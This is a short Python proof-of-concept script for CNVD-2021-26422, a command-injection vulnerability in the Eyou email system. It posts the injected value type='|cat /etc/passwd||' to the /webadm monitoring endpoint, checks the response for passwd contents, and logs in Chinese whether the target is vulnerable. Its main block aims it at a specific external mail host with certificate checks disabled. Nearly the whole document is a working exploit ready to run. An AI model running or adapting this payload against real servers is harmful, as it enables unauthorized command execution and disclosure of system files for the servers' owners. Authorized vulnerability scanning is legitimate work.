import requests
from loguru import logger
from urllib import parse
import urllib3

urllib3.disable_warnings()


class EyouEmailPoc:
    @staticmethod
    def get_headers():
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        return headers

    def verify(self, url):
        logger.info("CNVD-2021-26422 Verify")
        target_url = parse.urljoin(url, "/webadm/?q=moni_detail.do&action=gragh")
        data = "type='|cat /etc/passwd||'"
        try:
            response = requests.post(url=target_url, headers=self.get_headers(),
                                     data=data, verify=False, timeout=5)
            logger.info("正在检测:{}".format(target_url))
            if response.status_code == 200 and "root:x:0:0" in response.text:
                logger.info("{}存在漏洞！！！".format(target_url))

            else:
                logger.info("未检测到该漏洞存在！！!")
        except Exception as e:
            logger.warning("{}访问失败！！！ ".format(url))


if __name__ == '__main__':
    poc_obj = EyouEmailPoc()
    poc_obj.verify("http://mail.onkeyclo.com")
